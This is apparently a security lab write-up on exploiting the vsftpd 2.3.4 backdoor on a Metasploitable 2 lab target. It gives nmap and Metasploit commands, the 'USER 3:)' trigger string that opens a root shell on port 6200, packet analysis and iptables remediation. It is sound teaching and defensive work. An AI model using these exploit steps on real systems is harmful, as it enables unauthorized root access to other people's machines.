# 🛡️ Vulnerability Assessment & Exploitation: vsftpd 2.3.4 Backdoor Analysis

## 📌 Executive Summary
This laboratory documentation demonstrates an end-to-end security assessment of the historic backdoor vulnerability in the **vsftpd 2.3.4** service. The project covers discovery via reconnaissance, exploitation to obtain root-level access, protocol-level deep packet inspection using Wireshark, and defensive hardening strategies using Linux netfilter/iptables.

---

## 🛠️ Environment & Tooling
* **Target System:** Metasploitable 2 (`192.168.56.102` / Linux Kernel 2.6.24)
* **Attacking Machine:** Kali Linux (`192.168.56.101`)
* **Network Scanner:** Nmap
* **Exploitation Framework:** Metasploit Framework (MSF)
* **Packet Analyzer:** Wireshark
* **Host Defense:** Linux `iptables`

---

## 🔍 Phase 1: Reconnaissance & Service Enumeration
An aggressive service and version detection scan was conducted to identify open network ports and vulnerable service banners on the target host:

```bash
sudo nmap -sV -p 21 192.168.56.102

## ⚙️ Phase 2: Exploitation Setup (Metasploit Framework)
The vulnerability verification was automated via Metasploit Framework using the dedicated exploit module:

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
show options

---

## 💥 Phase 3: Exploitation & Proof of Concept (PoC)
Upon executing the exploit module, the backdoor routine was successfully triggered. The handler spawned an interactive session, granting absolute administrative privileges (`root`) over the target machine:

* **Privilege Verification Commands:**
  * `whoami` ➔ Confirmed user execution context as **root**.
  * `id` ➔ Confirmed user UID `0` and GID `0`.
  * `uname -a` ➔ Verified kernel and system architecture.

![Root PoC](03_Root_Exploit_PoC.png)

---

## 🔬 Phase 4: Network Traffic & Packet Analysis (Wireshark)
To understand the underlying mechanics, deep packet inspection was performed using **Wireshark** filtering for ports `21` and `6200`:

* **Backdoor Trigger Mechanism:** Inspecting the TCP stream on port 21 revealed that the exploit sends a username string terminated with a smiley face sequence (`USER 3:)`).
* **Technical Impact:** In vulnerable builds, this specific sequence instructs the service to spawn a command shell listener on TCP port `6200`, enabling unauthenticated remote code execution.

![Traffic Analysis](04_Traffic_Analysis_TCP_Stream.png)

---

## 🛡️ Phase 5: Remediation & Defensive Hardening
To prevent similar vulnerabilities in production environments, the following defensive measures must be implemented:

1. **Service Upgradation & Patch Management:**
   * Immediately upgrade `vsftpd` to secure, patched versions or transition entirely to actively maintained FTP daemons.
2. **Network Perimeter Filtering (iptables):**
   * Configure host-based firewalls to drop unauthorized inbound traffic on abnormal or dangerous listening ports:
     ```bash
     sudo iptables -A INPUT -p tcp --dport 6200 -j DROP
     sudo iptables -L -n -v
     ```
3. **Protocol Modernization:**
   * Deprecate cleartext protocols (FTP) completely and enforce encrypted alternatives such as **SFTP (SSH File Transfer Protocol)** or **FTPS**.
